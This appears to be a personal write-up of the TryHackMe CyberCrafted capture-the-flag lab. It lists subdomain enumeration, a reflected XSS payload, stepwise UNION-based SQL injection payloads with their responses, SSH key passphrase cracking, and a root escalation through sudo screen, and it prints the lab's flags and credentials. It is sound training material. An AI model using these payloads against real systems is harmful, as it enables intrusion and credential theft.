# Hack Log 7 - TryHackMe [CyberCrafted](https://tryhackme.com/room/cybercrafted)

📆:**Date:** 2025-06-16  
🔍**Objective:** Obtain flags (web_flag, minecraft_server_flag, user_flag, root_flag) and root the machine.  
🎯**Target**: TryHackme CyberCrafted (Lab CTF)  

---  

## 🛠️ Actions Taken  
### **Adding hostname**  

→ Added **cybercrafted.thm** as hostname for the IP 10.10.101.5
   
### **Port and Service Enumeration**
  ```
  nmap -A -p- 10.10.101.5
  ```
| Port    | Service  | Description                    |
|---------|----------|--------------------------------|
| 22 | ssh    | OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)|                 |
| 80 | http     | Apache httpd 2.4.29                  |
| 25565 | minecraft     | Minecraft 1.7.2        |

→ Subdoamin Enumeration  
  ```  
  ffuf -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302
  ```       
→ Subdomain enumeration revealed following useful subdomains.  

  - admin  
  - store  
        
→ Enumerating further on "store.cybercrafted.thm" revealed "/search.php" endpoint.  

### **Discovery of XSS and SQL Injection**  

→ Reflected XSS in **admin.cybercrafted.thm**  
  - Visiting the above subdomain revealed a login page.  
  - Upon trying to log in with random credentials and observing the response there is a redirect.    
    ```
    admin.cybercrafted.thm/?error=Incorrect username or password  
    ```
  - Modified the value in the "/?error" parameter and found that it is being reflected in the page itself.  
  - Injected the Javascript payload as  
    ```  
    admin.cybercrafted.thm/?error=<script>alert('XSS')</script>  
    ```
  - Injection was succesfully reflected back which confirms XSS.  

→ SQL Injection in **store.cybercrafted.thm/search.php**  
  - Visiting the above subdomain revealed a search bar.  
  - Captured the search request in BurpSuite and sent it to Burp Repeater.  
    ```
    POST /search.php HTTP/1.1
    Host: store.cybercrafted.thm
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 19
    Origin: http://store.cybercrafted.thm
    Connection: keep-alive
    Referer: http://store.cybercrafted.thm/search.php
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i

    search=iron&submit=
    ```
  - Injected the sql in "search" parameter as
    ```
    search='--+
    ```
    - It resulted in all table entries being sent in the response.
      ```
        <div class="output">
        <div class="table">
          <table>
                <tr>
                    <th>Item</th>
                    <th>Amount</th>
                    <th>Cost</th>
                <tr>
                <tr>
                    <td>Acacia Boat</td>
                    <td>1x</td>
                    <td>0.5$</td>
                </tr>
                <tr>
                    <td>Armor Stand</td>
                    <td>1x</td>
                    <td>0.5$</td>
                </tr>
                <tr>
                    <td>Beetroot Seeds</td>
                    <td>16x</td>
                    <td>0.2$</td>
                </tr>
            ..............
      ```
    - Injected UNION payload as  
      ```
      search='%20UNION%20SELECT%201,2,3,4--+
      ```
    - The injection was successsful and revealed that there are 4 columns being reflected in the response but only columns 2,3,4 are rendered in HTML.  
      ```
      <tabel>
      ..Other entries ...          
      <tr>
      <td>2</td>
      <td>3</td>
      <td>4</td>
      </tr>
      </table>  
      ```
    - Injected payload to extract table names as  
      ```
      search='%20Union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()--+
      ```
      The response included two tables named as **admin**, **stock** respectively.  
      ```
      <table>
                <tr>
                    <td>admin</td>
                    <td>3</td>
                    <td>4</td>
                </tr>
                <tr>
                    <td>stock</td>
                    <td>3</td>
                    <td>4</td>
                </tr>
      </table>
      ```
    - Injected payload to extract column names in 'admin' table  
      ```
      search='%20Union%20select%201,column_name,3,4%20from%20information_schema.columns%20where%20table_name='admin'--+
      ```
      Received three columns in response as 'id','user','hash'.  
      ```
      <tr>
                  <td>id</td>
                  <td>3</td>
                  <td>4</td>
      </tr>
      
      <tr>
                    <td>user</td>
                    <td>3</td>
                    <td>4</td>
      </tr>
      
      <tr>
                    <td>hash</td>
                    <td>3</td>
                    <td>4</td>
      </tr>
      ```

    - Injected payload to extract data from 'admin' table  
      ```
      <tr>
                    <td>1</td>
                    <td>xXUltimateCreeperXx</td>
                    <td>88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01</td>
      </tr>
      <tr>
                    <td>4</td>
                    <td>web_flag</td>
                    <td>THM{bbe315906038c3a62d9b195001f75008}</td>
       </tr>
      ```
      Successfully retrieved username and password hash alongwith the web_flag.  

### Post Exploitation  

→ Cracked the obtained password hash.  
→ Logged in with the credentials in admin.cybercrafted.thm page.  
→ After logging in found an admin panel to input system commands.  
→ Executed system commands and found the current user is 'www-admin' and two user directories in /home directory  
  - cybercrafted  
  - xxultimatecreeperxx  
→ Found private ssh key 'id_rsa' in /home/xxultimatecreeperxx/.ssh  

### Privilege Escalation   

→ Horizontal Escalation to user 'xxultimatecreeperxx'  
  - Copied the private RSA key to local machine.  
  - Changed the permission  
    ```
    chmod 600 id_rsa  
    ```
  - Tried logging in using the key via ssh  
    ```
    ssh xxultimatecreeperxx@10.10.101.5 -i id_rsa
    ```
    Prompted to provide the key passphrase  
  - Bruteforcing passphrase  
    ```
    python3 /opt/john/ssh2john id_rsa > id_rsa.hash

    john --wordlist=/usr/share/wordlist/rockyou.txt id_rsa.hash  
    ```
    Found the passphrase as "creepin2006"  
  - Succesfully logged in as "xxultimatecreeperxx" after providing the passphrase.  

→ Tried to escalate privilege using suid binaries, and ran scripts but nothing useful was found.  
→ Upon inspecting crontab found a "tar" job scheduled, referencing the directory "/opt/minecraft".  
→ Found minecraft_server_flag in "/opt/minecraft" directory.  
→ In the same directory found a directory named as "cybercrafted".  
  ```
  xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls -la
  total 19568
  -------------contents----------

  drwxr-x--- 3 cybercrafted minecraft     4096 Jun 27  2021 plugins

  -------------contents-----------
  ```
  Found another interesting directory named as "plugins" among other content.  

→ The "plugins" directory contained a another directory named "LoginSystem".  
  ```
  xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -la
  total 56
  drwxr-x--- 3 cybercrafted minecraft  4096 Jun 27  2021 .
  drwxr-x--- 7 cybercrafted minecraft  4096 Jun 27  2021 ..
  drwxr-x--- 2 cybercrafted minecraft  4096 Oct  6  2021 LoginSystem
  -rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27  2021 LoginSystem_v.2.4.jar
 ```

→ Inspecting further in the LoginSystem directory found a log file "log.txt" which included password in plain text.  
  ```
  xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt 

  [2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
  [2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
  [2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
  [2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
  [2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
  [2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
  [2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock  
  ```
→ Succesfully changed user to cybercrafted using the obtained password.  
→ Found user_flag in the home directory of user "cybercrafted".  

→ Vertical Privilege Escalation  
  - Doing "sudo -l" revealed a binary which runs as root  
    ```
    /usr/bin/screen -r cybercrafted
    ```
  - Running the binary opened a screen to manage the minecraft server, nothing useful.  
  - Opened man page for the binary and found an entry which mentioned the key combination to "Create a new window with shell and switch to that windows".  
    ```
    Ctrl + A
    Ctrl + C  
    ```
  - Succedfully obtained a root shell.  
  - Obtained the root_flag from the root directory.



## 🔍 Key Findings  
- SQL Injection in store.cybercrafted.thm/search.php revealed user credentials.
- Passwords saved as plain text in log file cause horizontal privilege escalation.
- "screen" binary with root permissions resulted in escalation to root.


## 📚 What I Learned  
- Enumeration can sometimes give false results or no results at all, better to use multiple wordlists and filter outputs.
- Vulnerabilities discovered do not always result in successful exploitation further, better to keep looking for more vulnerabilities.  
    






        
      

